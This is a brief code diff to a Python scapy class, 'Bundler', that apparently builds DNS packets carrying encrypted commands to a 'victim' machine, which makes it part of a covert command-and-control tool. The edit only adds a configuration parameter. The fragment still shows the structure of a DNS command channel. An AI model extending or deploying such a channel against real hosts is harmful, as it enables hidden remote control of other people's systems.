@@ -4,11 +4,12 @@ from scapy.all import *
 
 class Bundler():
 
-    def __init__(self, victim_mac, victim_packet):
+    def __init__(self, victim_mac, victim_packet, config):
         self.victim_mac = victim_mac
         self.victim_packet = victim_packet
         self.fake_hostname = self.victim_packet.getlayer(DNSQR).qname
         self.victim_id = victim_packet.getlayer(Ether).src
+        self.config = config
 
     def build_command_pkt(self, encrypted_comand):
         p = self._build_ether() / self._build_ip() / self._build_udp() / self._build_dns(encrypted_comand)
